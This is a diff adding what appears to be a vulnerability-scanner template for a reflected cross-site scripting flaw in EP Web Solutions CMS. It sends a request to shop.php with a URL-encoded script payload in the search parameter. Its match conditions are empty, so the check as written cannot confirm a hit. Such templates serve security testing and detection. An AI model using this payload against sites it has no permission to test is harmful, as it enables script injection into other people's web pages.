@@ -1,0 +1,18 @@
+id: ep-web-cms-xss
+brief:
+    title: EP Web Solutions CMS - Cross Site Scripting
+    by: r3Y3r53
+    level: medium
+    about: Cross-site scripting is an attack in which an attacker injects malicious executable scripts into the code of a trusted application or website.
+    label:
+        - xss
+        - epweb
+        - unauth
+        - cms
+        - vuln
+    score: CVSS:6.1
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/shop.php?search=%22/%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
+      signs: []
